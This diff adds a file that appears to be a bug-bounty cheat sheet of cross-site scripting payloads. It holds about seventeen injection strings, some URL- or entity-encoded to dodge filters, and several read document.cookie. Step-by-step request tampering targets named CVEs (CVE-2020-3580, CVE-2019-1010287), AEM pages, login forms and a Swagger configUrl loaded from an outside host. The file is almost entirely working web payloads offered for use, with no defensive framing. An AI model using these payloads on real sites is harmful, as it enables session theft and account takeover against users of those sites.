@@ -1,0 +1,52 @@
+
+1. CVE-2020-3580
+capture Request and send to repeater
+change request Method GET To Post
+You have to add ?tgname=a
+Add this payload: SAMLResponse="><svg/onload=alert("XSS")>
+
+2. "><img src="/" =_=" title="onerror='prompt(document.cookie)'">
+
+3. %0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+4. javascript:alert(document.domain);&message=Not+Found&site_name=404
+
+5. %3Cimg%20src=x%20data%27a%27onerror=alert%28domain%29%3E.childrenlist.html {AEM}
+
+6. %22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+7. <img src=x onerror=alert('XSS');>
+
+8. %22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e.asp
+
+"><SVG ONLOAD=&#97&#108&#101&#114&#116(&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x64&#x6f&#x6d&#x61&#x69&#x6e)>.asp
+
+
+9. %27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E
+
+10. <img/src/onerror=prompt(8)>
+
+11. POST BASED
+intercept the request and change request menthod
+add Content-Type: application/json;charset=UTF-8
+and add {"<img onerror=confirm('xss') src/>":1} in body
+now check response in browser you will find the POP-UP
+
+
+12. Swagger Outdated
+?configUrl=https://xss.smarpo.com/test.json
+
+13. \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
+
+14. hack%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Bsubmit%5D=Change%20Password&login%5Buse_curr%5D=1
+
+15. =%3Csvg/onload=alert(1)%3E
+
+16. POST BASED CVE-2019-1010287
+intercept the req
+change Content-Type to application/x-www-form-urlencoded
+change section
+add """username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login""" in body now use the "Show response in Browser"
+
+17.
+%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
